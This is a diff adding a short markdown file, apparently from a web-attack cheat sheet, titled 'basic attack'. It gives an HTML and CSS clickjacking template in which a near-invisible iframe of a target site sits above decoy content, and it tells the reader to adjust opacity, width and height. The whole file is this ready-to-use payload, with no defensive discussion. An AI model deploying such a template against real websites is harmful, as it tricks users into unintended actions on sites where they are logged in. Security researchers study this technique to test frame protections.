@@ -1,0 +1,29 @@
+# basic attack
+
+change **opacity + width + height** values as you wish: 
+```html
+<head>
+  <style>
+    #target_website {
+    	position:relative;
+    	width:128px;
+    	height:128px;
+    	opacity:0.00001;
+    	z-index:2;
+    	}
+    #decoy_website {
+    	position:absolute;
+    	width:300px;
+    	height:400px;
+    	z-index:1;
+    	}
+  </style>
+</head>
+...
+<body>
+  <div id="decoy_website">...decoy web content here...</div>
+  <iframe id="target_website" src="https://vulnerable-website.com"></iframe>
+</body>
+```
+
+
